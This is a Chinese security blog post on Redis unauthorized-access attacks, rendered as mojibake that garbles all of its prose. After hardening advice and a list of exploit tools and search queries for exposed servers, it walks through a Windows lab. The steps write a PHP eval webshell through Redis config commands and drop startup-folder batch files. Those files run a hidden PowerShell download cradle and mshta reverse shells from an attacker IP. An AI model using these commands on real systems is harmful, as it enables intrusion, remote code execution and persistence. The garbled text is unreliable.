href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ redis çš„é…ç½®æ–‡ä»¶è®¾ç½®å¯†ç å‚æ•°ï¼Œè¿™æ ·å®¢æˆ·ç«¯è¿æ¥åˆ° redis æœåŠ¡å°±éœ€è¦å¯†ç éªŒè¯ï¼Œè¿™æ ·å¯ä»¥è®©ä½ çš„ redis æœåŠ¡æ›´å®‰å…¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ˜¯å¦è®¾ç½®äº†å¯†ç éªŒè¯ï¼š</p><p>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>â€œrequirepassâ€</li><li>â€œâ€<br>é»˜è®¤æƒ…å†µä¸‹ requirepass å‚æ•°æ˜¯ç©ºçš„ï¼Œè¿™å°±æ„å‘³ç€ä½ æ— éœ€é€šè¿‡å¯†ç éªŒè¯å°±å¯ä»¥è¿æ¥åˆ° redis æœåŠ¡ã€‚</li></ol><p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ä¿®æ”¹è¯¥å‚æ•°ï¼š</p><p>127.0.0.1:6379&gt; CONFIG set requirepass â€œrunoobâ€<br>OK<br>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>â€œrequirepassâ€</li><li>â€œrunoobâ€<br>è®¾ç½®å¯†ç åï¼Œå®¢æˆ·ç«¯è¿æ¥ redis æœåŠ¡å°±éœ€è¦å¯†ç éªŒè¯ï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚</li></ol><p>AUTH å‘½ä»¤åŸºæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>127.0.0.1:6379&gt; AUTH password<br>127.0.0.1:6379&gt; AUTH â€œrunoobâ€<br>OK<br>127.0.0.1:6379&gt; SET mykey â€œTest valueâ€<br>OK<br>127.0.0.1:6379&gt; GET mykey<br>â€œTest valueâ€<br>ä¿®æ”¹é»˜è®¤é…ç½®ï¼Œè®¾ç½®è®¿é—®å¯†ç ä¸ºå¼ºå¯†ç ã€‚<br>port ä¿®æ”¹redisä½¿ç”¨çš„é»˜è®¤ç«¯å£å·</p><p>bind è®¾å®šredisç›‘å¬çš„ä¸“ç”¨IP</p><p>requirepass è®¾å®šredisè¿æ¥çš„å¯†ç </p><p>rename-command CONFIG â€œâ€ã€€ ï¼ƒç¦ç”¨CONFIGå‘½ä»¤</p><p>rename-command info info2 #é‡å‘½åinfoä¸ºinfo2</p><p>è®¾ç½®é˜²ç«å¢™ç­–ç•¥ï¼Œæ·»åŠ è®¿é—®redis ç™½åå•ã€‚<br>iptables -A input -s x.x.x.x -p tcp â€“dport 6379 -j ACCEPT<br>æƒé™æœ€å°åŸåˆ™ã€‚<br>ä»¥ä½æƒé™ç”¨æˆ·å¯åŠ¨redis æœåŠ¡</p><p>ç¦ç”¨/é‡å‘½åé«˜å±å‘½ä»¤ï¼Œå¦‚config , flushall, eval<br>redis ä¸æš´éœ²å…¬ç½‘ bind 127.0.0.1 , protected-mode yes<br>ä¿®æ”¹authorized_keysæ–‡ä»¶çš„æƒé™å¯¹æ‹¥æœ‰è€…åªè¯»ï¼Œå…¶ä»–ç”¨æˆ·æ— æƒé™<br>ç›¸å…³èµ„æ–™<br><a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a> è§£å†³æ— æ³•è¿œç¨‹è¿æ¥Redis</p><p><a href="https://www.cnblogs.com/linjiqin/p/8608975.html">https://www.cnblogs.com/linjiqin/p/8608975.html</a> å¤ä¹ ä¸€ä¸‹docker</p><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a> Crontab</p><p><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t2">https://www.cnblogs.com/kismetv/p/9236731.html#t2</a> Redis ä¸»ä»å¤åˆ¶å­¦ä¹ </p><p><a href="http://yulige.top/?p=775#_RCE">http://yulige.top/?p=775#_RCE</a> ä¸€ç¯‡æ€»ç»“éå¸¸å¥½å¹¶ä¸”å…¨é¢çš„Redis å®‰å…¨åšæ–‡</p><p>[<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]">https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]</a>(<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1">https://www.k0rz3n.com/2019/07/29/å¯¹ä¸€æ¬¡</a> redis æœªæˆæƒå†™å…¥æ”»å‡»çš„åˆ†æä»¥åŠ redis 4.x RCE å­¦ä¹ /) ä¹Ÿæ˜¯ä¸€ç¯‡è¶…çº§æ£’çš„æ–‡ç« </p><p><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a> æœªæˆæƒæ”»å‡»Redis</p><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a> ä¸»ä»å¤åˆ¶æ”»å‡»æ‰‹æ³•åŸç†pdf</p><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a> ä¸»ä»å¤åˆ¶æ”»å‡»Redis</p><p><a href="https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a></p><p><a href="https://joychou.org/web/phpssrf.htmld">https://joychou.org/web/phpssrf.htmld</a> SSRF</p><p><a href="https://www.anquanke.com/post/id/181599">https://www.anquanke.com/post/id/181599</a> SSRF è®¤è¯æ”»å‡»Redis</p><p><a href="https://xz.aliyun.com/t/5665#toc-8">https://xz.aliyun.com/t/5665#toc-8</a> SSRF æ”»å‡»redis çš„æ€»ç»“</p><p><a href="https://lorexxar.cn/2016/12/03/redis-getshell/#centos">https://lorexxar.cn/2016/12/03/redis-getshell/#centos</a> redis getsell çš„ä¸€äº›æ€è€ƒ</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd</a> ç»†æ•°redis çš„å‡ ç§getshell æ–¹æ³•</p><p>ç›¸å…³å·¥å…·<br>Redis + SSRF payload ç”Ÿæˆï¼š<br><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> æ”¯æŒReverseShell å’Œ PHPShell</p><p>Redis å£ä»¤æš´ç ´<br><a href="https://github.com/evilpacket/redis-sha-crack">https://github.com/evilpacket/redis-sha-crack</a></p><p>Redis Rogue Server<br><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p><p><a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>ä¸»ä»å¤åˆ¶åŠ è½½çš„æ¶æ„so æ–‡ä»¶<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p><p>MSF ä¸‹çš„åˆ©ç”¨æ¨¡å—<br>auxiliary/scanner/redis/file_upload normal Redis File Upload</p><p>auxiliary/scanner/redis/redis_login normal Redis Login Utility</p><p>auxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner</p><p>æ¼æ´æŒ–æ˜<br>å¯¹ port:6379 æœç´¢<br><a href="https://www.zoomeye.org/searchResult?q=port:6379">https://www.zoomeye.org/searchResult?q=port:6379</a></p><p>Fofa å…³é”®å­—æœç´¢<br>port=â€6379â€ &amp;&amp; protocol==redis &amp;&amp; country=CN<br>å¯¹Web ç½‘ç«™çš„çœŸå®ip è¿›è¡Œå…¨ç«¯å£æ‰«æ / æ¢æµ‹ redis</p><hr><h1 id="Windowsä¸‹Redis-åˆ©ç”¨æ€è·¯"><a href="#Windowsä¸‹Redis-åˆ©ç”¨æ€è·¯" class="headerlink" title="Windowsä¸‹Redis åˆ©ç”¨æ€è·¯"></a>Windowsä¸‹Redis åˆ©ç”¨æ€è·¯</h1><p>å­¦äº†ä¸¤å¤©çš„Cobalt Strike 4.0 çš„åŸºç¡€ä½¿ç”¨å’Œæœ¯è¯­ï¼Œç»§ç»­æŠŠä¹‹å‰æ¼æ‰çš„Windows ä¸‹åˆ©ç”¨Redis å­¦ä¹ æ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤ªéš¾äº†ï¼ŒWindows Server 2008 R2 æˆ‘è¿™é‡Œ(VMware Fusion)æ²¡æ³•ç”¨VMware Toolsï¼ŒGithubï¼ˆå›¾ç‰‡ä¸Šgithub URLæ‰“é”™äº†ï¼‰ åˆä¸èƒ½è®¿é—®ï¼Œæœºå™¨ä¸Šä¹Ÿæ²¡æœ‰Githubã€‚æˆ‘æ˜¯å¦‚ä½•æŠŠWindows ç‰ˆçš„Redis å¼„ä¸Šå»çš„ï¼Ÿå“ˆå“ˆï¼ˆå…¶å®åé¢æƒ³äº†æƒ³è¿˜æœ‰å…¶ä»–åŠæ³•ï¼Œä¸è¿‡æ„Ÿè§‰ä¹Ÿæœ‰ç‚¹éº»çƒ¦ã€‚</p><p><img src="https://i.imgur.com/KRBRvS9.png"></p><p><img src="https://i.imgur.com/39WhmIK.png"></p><p>å› ä¸ºä¹‹å‰å¤ç° MS17-010ï¼ŒCVE-2019-0708ï¼Œå¼€å¯äº†445 å’Œ 3389 ã€‚æˆ‘è¿™é‡Œç”¨ms17-010 æ‰“è¿‡å»ï¼Œæ‹¿åˆ°äº†system æƒé™<br>ç”¨Cobalt Strike ç”Ÿæˆä¸Šçº¿ 64 ä½çš„exe å¯æ‰§è¡Œæ–‡ä»¶ä¸Šçº¿æœ¨é©¬<br>MSF ä¸Šä¼ æœ¨é©¬å¹¶æ‰§è¡Œ<br>Cobalt Strike ä¸Š2008 R2 æˆåŠŸ ä¸Šçº¿<br>ç„¶åä¹Ÿä¸èƒ½ä¼ ç›®å½•ï¼ˆå¯ä»¥ä¼ å‹ç¼©åŒ…ï¼Œç»ˆäºæ‡‚äº†ä¸ºä»€ä¹ˆæœ‰äº›ä¸œè¥¿ä¸èƒ½ä¼ æ–‡ä»¶å¤¹äº†ï¼‰ï¼Œä½†æ˜¯ç›¸æ¯”ç”¨msfï¼Œè¿™é‡Œå¯è§†åŒ–ä¸Šä¼ ä¹Ÿæ˜¯å¾ˆä¸é”™äº†ã€‚<br><img src="https://i.imgur.com/HMYcnTZ.png"></p><p><img src="https://i.imgur.com/A41ZMox.png"></p><p>ç®—æ˜¯ç¬¬ä¸€æ¬¡åŒæ—¶ä½¿ç”¨Metasploit å’Œ Cobalt Strikeã€‚</p><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>Redis-Serverï¼šWindows Server 2008 R2 x64<br>Attackerï¼šKali Linux<br>ç½‘ç»œï¼šNAT<br>IPï¼š192.168.118.134ï¼Œ192.168.118.129<br>PhpStudy 2018 æ­å»º Web æœåŠ¡,éœ€è¦ç›¸å…³vcè¿è¡Œåº“<br>åˆ‡æ¢åˆ°å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œredi-server.exe redis.conf å³å¯å¯åŠ¨redis-server æœåŠ¡ã€‚<br><img src="https://i.imgur.com/U6Z4tkr.png"></p><p>netstat -ano æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ<br><img src="https://i.imgur.com/UANrinf.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»å¼€å¯äº† 6379 Redis æœåŠ¡ã€‚</p><p>å°è¯•è¿æ¥ä¸€ä¸‹<br><img src="https://i.imgur.com/n9gYmuj.png"></p><p>ping è¿”å› PONGã€‚æˆåŠŸè¿œç¨‹æœªæˆæƒè¿æ¥ä¸ŠRedisã€‚ï¼ˆç›¸æ¯”ä¸Linuxä¸‹å¤ç°ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰ä¿®æ”¹ä»»ä½•redis.confçš„å†…å®¹ï¼Œéš¾é“æ˜¯è¯´Windowsä¸‹é»˜è®¤å¯ä»¥ã€‚</p><h2 id="æ”»å‡»åœºæ™¯"><a href="#æ”»å‡»åœºæ™¯" class="headerlink" title="æ”»å‡»åœºæ™¯"></a>æ”»å‡»åœºæ™¯</h2><p>ç›¸æ¯”äºLinux ä¸‹æ”»å‡»Redis æœªæˆæƒï¼ŒWindows ä¸‹åˆæœ‰å“ªäº›å¯ä»¥åˆ©ç”¨çš„ï¼ŸLinux ä¸‹å¯ä»¥å†™å…¥Webshellï¼ŒWindows ä¸‹è‚¯å®šä¹Ÿè¡Œã€‚Linux ä¸‹å¯ä»¥å†™å…¥SSHï¼Œå¯¼è‡´SSH è¿œç¨‹ç™»å½•ç›®æ ‡æœºå™¨ï¼Œè€ŒWindowsæ²¡æœ‰ã€‚</p><h3 id="å†™å…¥Webshell"><a href="#å†™å…¥Webshell" class="headerlink" title="å†™å…¥Webshell"></a>å†™å…¥Webshell</h3><p>è¿™ç§æ–¹æ³•æœ€å®¹æ˜“æƒ³åˆ°ï¼Œä¹Ÿç›¸å¯¹æ¥è¯´æœ‰ç‚¹é¸¡è‚‹ï¼Œå› ä¸ºå¿…é¡»è¦çŸ¥é“Windows ä¸‹æ­å»ºçš„Web æœåŠ¡çš„ç½‘ç«™ç‰©ç†è·¯å¾„ï¼Œæ‰èƒ½å¾€é‡Œé¢å†™webshellï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çŒœæµ‹ï¼Œæˆ–è€…ä¸“é—¨å»æ”¶é›†ä¸€äº›å¸¸è§çš„ç½‘ç«™ç‰©ç†è·¯å¾„ä½ç½®ã€‚(è¿™æ¬¡æˆ‘å‘ç°ç”¨PHPStudy2018 å®‰è£…é»˜è®¤å­˜åœ¨ä¸€ä¸ªphpinfo.phpï¼Œä»¥åŠphpMyadmin)</p><p><img src="https://i.imgur.com/ydL4RPh.png"></p><p>ä¸ä¸€ä¼šå„¿ï¼Œæœ‰ä¸€ä¸ªå¸ˆå‚…èµ°è¿‡æ¥ï¼Œé—®æˆ‘åœ¨å¹²å˜›ï¼Œæˆ‘è¯´åœ¨å­¦æ‰“Redisâ€¦â€¦ ä»–è¯´ï¼Œä½ æ€ä¹ˆåˆåœ¨æ‰“Redisã€‚ã€‚ã€‚ç„¶åå°±è®¨è®ºäº†ä¸€ä¸‹(å¤§æ¦‚è¯´äº†æœ‰äº”åˆ†é’Ÿå·¦å³ï¼Œè¿™é‡Œå°±è¯´ä¸‹è®¨è®ºçš„ç»“è®ºï¼‰ï¼Œå‡è®¾Windows æœåŠ¡å™¨ä¸‹çš„Redis è‚¯å®šåœ¨å†…ç½‘ï¼Œ6379ä¸å‡ºç½‘ï¼Œç„¶åå¦‚æœå­˜åœ¨SSRFçš„ç‚¹ï¼Œé‚£ä¹ˆç”¨gopher åè®®å¯èƒ½å¯ä»¥æ‰“ä¸€æ³¢ SSRF æ”»å‡»å†…ç½‘æœªæˆæƒï¼Œå†™å…¥webshellï¼Œæˆ–è€…åå¼¹shellå•¥çš„ã€‚ä½†æ˜¯ï¼Œå¦‚ä½•æ‰“å…¥å†…ç½‘çš„é—®é¢˜ä¼¼ä¹æ‰æ˜¯åˆ©ç”¨çš„å…³é”®ï¼Œè€Œæˆ‘æ€»ç»“çš„è¿™äº›æ„Ÿè§‰éƒ½æ˜¯å·²ç»åœ¨å†…ç½‘äº†æˆ–è€…æ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªæœªæˆæƒçš„è®¿é—®äº†ï¼Œå¦‚æœæ²¡æœ‰SSRFä¼¼ä¹å°±æ²¡æœ‰åŠæ³•äº†(å°±å•ç‹¬è¯´ä»è¿™ä¸€å°æœºå™¨ã€‚æˆ‘æƒ³åˆ°ä¸€ç§ï¼Œå°±æ˜¯RCEä¿®æ”¹redis.conf,ç„¶åè®©6379 æš´éœ²å…¬ç½‘ï¼Œç„¶ååšä¸€ä¸ªéšè—åé—¨ï¼Œæ„Ÿè§‰åº”è¯¥å¯ä»¥è¿™æ ·åˆ©ç”¨ã€‚å½“ç„¶ï¼Œå·²ç»æœ‰RCEï¼Œé‚£ä¹ˆè‚¯å®šç¬¬ä¸€ä»¶æ˜¯å°±æ˜¯æ‹¿shelläº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ€è·¯æˆ‘è§‰å¾—åªèƒ½è¯´æ˜¯åœ¨åé¢æƒé™æŒç»­æ§åˆ¶çš„æ—¶å€™ï¼Œå½“ä½œä¸€ç§æ€è·¯ç½¢äº†ï¼ˆæ„Ÿè§‰å…·ä½“å®ç°æ€§çš„è¯ä¹Ÿä¸æ˜¯å¾ˆè¡Œã€‚æ™šä¸Šæˆ‘åˆæƒ³åˆ°ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¿¡æ¯æ³„æ¼ï¼Œæ¯”å¦‚è¯´å†…ç½‘ipä¿¡æ¯æ³„æ¼å•¥çš„ï¼Œæ¥è¿›å…¥å†…ç½‘ï¼Ÿå…¶ä»–æ–¹æ³•ï¼Œå¯ä»¥ä»¥åæœ‰æƒ³æ³•äº†ï¼Œå†æ¥ç ”ç©¶ç ”ç©¶ã€‚</p><p>å¾—åˆ°ç‰©ç†è·¯å¾„ï¼šC:/Users/Administrator/Desktop/PHPTutorial/WWW</p><p>ç„¶åå°±å’ŒLinux ä¸‹å†™Webshell å·®ä¸å¤šäº†ï¼Œåªæ˜¯æ¢äº†ä¸€ä¸‹dir è·¯å¾„ï¼Œå’Œæ¢è¡Œç¬¦çš„åŒºåˆ«ï¼Œå› ä¸ºWindows å’Œ Linux çš„æ¢è¡Œç¬¦æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™é‡Œæ˜¯Windowsï¼Œæ‰€ä»¥æ˜¯\r\nï¼ˆä¹Ÿæ˜¯ä¸€æ ·ï¼Œé¿å…å’ŒåŸå§‹æ•°æ®æ··æ·†ï¼‰</p><p>192.168.118.134:6379&gt; config set dir C:/Users/Administrator/Desktop/PHPTutorial/WWW<br>OK<br>192.168.118.134:6379&gt; set webshell â€œ\r\n<?php @eval($_POST[a]);?>\r\nâ€<br>OK<br>192.168.118.134:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.134:6379&gt; save<br>OK<br><img src="https://i.imgur.com/AxEyXv7.png"></p><p>è¿˜å‘ç°äº†ï¼Œè¿™äº›æ“ä½œï¼Œä¼¼ä¹éƒ½ä¼šè¢«è®°å½•è¿›redis æ—¥å¿—çš„ã€‚</p><p><img src="https://i.imgur.com/guAkaO1.png"></p><p>å½“ç„¶ï¼Œä½¿ç”¨shell ç®¡ç†å™¨ï¼Œæ¯”å¦‚èšå‰‘æ˜¯è‚¯å®šèƒ½è¿ä¸Šçš„ã€‚</p><p>æŸ¥çœ‹ä¸€ä¸‹webshell.php<br>Redis å†™æ–‡ä»¶ä¼šè‡ªåŠ¨å†™å…¥ä¸€è¡Œç‰ˆæœ¬ä¿¡æ¯ã€‚ç„¶åå†æ˜¯æˆ‘ä»¬å†™çš„ä¸œè¥¿ã€‚</p><p><img src="https://i.imgur.com/BhlKVPY.png"></p><p>è¯´æ˜äº†ä¹‹å‰åœ¨å­¦ä¹ Linuxä¸‹åˆ©ç”¨rediså†™webshellçš„æ—¶å€™ï¼Œå…¶å®ä¸ç”¨flushall ä¹Ÿå¯ä»¥å†™webshellçš„ï¼Œåœ¨æ–°çš„ä¸€ä¸ªdbfile é‡Œé¢å†™å…¥å°±è¡Œäº†ã€‚</p><h3 id="å†™å…¥å¯åŠ¨é¡¹"><a href="#å†™å…¥å¯åŠ¨é¡¹" class="headerlink" title="å†™å…¥å¯åŠ¨é¡¹"></a>å†™å…¥å¯åŠ¨é¡¹</h3><p>â€œç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹â€å’Œâ€œç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹â€çš„åŒºåˆ«ï¼š</p><p>1ã€ä¸¤è€…å¯åŠ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ä¸ä¸€æ ·ã€‚ç”¨æˆ·å¼€æœºå¯åŠ¨æ–‡ä»¶å¤¹ï¼Œå¯¹åº”â€œå¼€å§‹èœå•â€-â€œç¨‹åºâ€-â€œå¯åŠ¨â€åŠŸèƒ½ï¼Œè·¯å¾„æ˜¯ï¼šâ€œC:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startupâ€ï¼›ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹å¯¹åº”çš„è·¯å¾„æ˜¯ï¼šâ€œC:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startupâ€ã€‚</p><p>2ã€ä¸¤è€…èµ·åˆ°çš„åŠŸèƒ½ä¸ä¸€æ ·ã€‚ä¸¾ä¾‹è¯´æ˜ï¼šå¦‚æœç³»ç»Ÿæœ‰adminå’Œguestä¸¤ä¸ªç³»ç»Ÿç”¨æˆ·ï¼Œadminä½¿ç”¨æ–¹æ³•ä¸€ï¼ˆç”¨æˆ·å¯åŠ¨æ–‡ä»¶å¤¹ï¼‰æ·»åŠ å¼€æœºå¯åŠ¨é¡¹ï¼Œé‚£ä¹ˆåªæœ‰ä½¿ç”¨adminç™»å½•ç³»ç»Ÿæ—¶ï¼Œå¼€æœºå¯åŠ¨é¡¹æ‰ä¼šèµ·ä½œç”¨ï¼Œguestç”¨æˆ·ç™»å½•ç³»ç»Ÿä¸ä¼šè‡ªåŠ¨å¯åŠ¨ï¼›è€Œä½¿ç”¨æ–¹æ³•äºŒï¼ˆç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹ï¼‰è®¾ç½®çš„å¼€æœºå¯åŠ¨é¡¹ï¼Œåœ¨adminå’Œguestç™»å½•ç³»ç»Ÿæ—¶éƒ½ä¼šå¯åŠ¨ã€‚</p><p>å†™å…¥å¯åŠ¨é¡¹ï¼Œå¤§æ¦‚æœ‰ä¸‰ç§æ”»å‡»è·¯çº¿ï¼Œåˆ©ç”¨msfï¼ŒCSï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯PS_Shell.rb æ¥ä¸Šçº¿ã€‚</p><p>åˆ©ç”¨Cobalt Strike<br>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ Metasploitã€‚</p><blockquote><p>Attacks -&gt; Web Drive-by -&gt; Scripted Web Deliveryï¼Œé€‰æ‹©Powershell</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.118.129:80&#x2F;aaa&#39;))&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åå’Œå†™å…¥Webshell ä¸€æ ·çš„æ–¹å¼ï¼Œå°†ä¸Šé¢çš„payload ä¿å­˜ä¸º.batæ–‡ä»¶ã€‚è¿™é‡Œå› ä¸ºpayloadé‡Œé¢æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œè½¬ä¹‰ã€‚</p><p>batï¼ˆæ‰¹å¤„ç†ï¼‰æ–‡ä»¶æ¦‚å¿µï¼šåœ¨DOSå’ŒWindows 9x æ“ä½œç³»ç»Ÿå®¶æ—ä¸­ï¼Œæ‰¹å¤„ç†æ–‡ä»¶çš„æ–‡ä»¶æ‰©å±•åä¸º.batã€‚å½“è¿è¡Œæ‰¹å¤„ç†æ–‡ä»¶æ—¶ï¼Œé€šå¸¸æ˜¯cmd.exeï¼Œä¼šè¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œå¹¶é€è¡Œè¿è¡Œã€‚</p><p>192.168.118.146:6379&gt; config set dir â€œC:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startupâ€<br>OK<br>192.168.118.146:6379&gt; config set dbfilename config.bat<br>OK<br>192.168.118.146:6379&gt; set shell_bat â€œ\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(â€˜<a href="http://192.168.118.129/aaa&#39;))\&quot;\r\n\r\n&quot;">http://192.168.118.129:80/aaa&#39;))\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>æ‰‹åŠ¨é‡å¯é¶æœºã€‚ã€‚å¯ä»¥å‘ç°ä¸»æœºä¸Šçº¿äº†ã€‚ï¼ˆè¿™é‡Œæˆ‘ä¸­é€”å»åƒé¥­äº†ï¼Œç„¶åå›æ¥åˆçœ‹äº†ä¸€ä¸‹å…³äºSRCç›¸å…³çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æ—¶é—´ä¸Šçœ‹èµ·æ¥ä¸Šçº¿å¾ˆæ™šï¼Œå®é™…ä¸Šï¼Œç­‰å¼€æœºä¹‹åè¿‡ä¸€ä¼šå„¿å°±ä¸Šçº¿äº†ï¼Œå¯èƒ½è¿™å–å†³äºç›®æ ‡ç³»ç»Ÿçš„æµç•…åº¦</p><p><img src="https://i.imgur.com/QDxyT31.png"></p><p>æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹<br><img src="https://i.imgur.com/TY3qpOp.png"></p><p>ç¡®å®æˆåŠŸå†™å…¥ï¼Œå¹¶ä¸”æ‰§è¡Œäº†ã€‚</p><h3 id="åˆ©ç”¨mshta-PS-shell"><a href="#åˆ©ç”¨mshta-PS-shell" class="headerlink" title="åˆ©ç”¨mshta PS_shell"></a>åˆ©ç”¨mshta PS_shell</h3><p>åˆ©ç”¨çš„exploitï¼š<a href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb">https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb</a></p><p>åœ¨/usr/share/metasploit-framework/modules/exploits/windowsä¸‹åˆ›å»ºä¸€ä¸ªPS_shell.rbæ–‡ä»¶ï¼Œå°†ä¸Šé¢çš„å†…å®¹å¡«å…¥è¿›å»ã€‚è¿›å…¥msfconsole ç„¶åé‡æ–°è½½å…¥ä¸€ä¸‹exploitï¼Œreload_allã€‚</p><p><img src="https://i.imgur.com/ugzwH85.png"></p><p>ç„¶åè¿è¡Œmshta.exe â€œâ€¦â€¦â€ å°±å¯ä»¥åå¼¹shelläº†ã€‚</p><p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨redis æœªæˆæƒï¼Œå†™å…¥å¯åŠ¨é¡¹æ¥è¿è¡Œï¼Œä»è€Œå¾—åˆ°åå¼¹shellã€‚</p><p>192.168.118.146:6379&gt; config set dir â€œC:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startupâ€<br>OK<br>192.168.118.146:6379&gt; config set dbfilename backup.bat<br>OK<br>192.168.118.146:6379&gt; set backup â€œ\r\n\r\n mshta.exe &quot;<a href="http://192.168.118.129:8080/tql/&quot;/r/n/r/n&quot;">http://192.168.118.129:8080/tql\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>æ‰‹åŠ¨é‡å¯ç›®æ 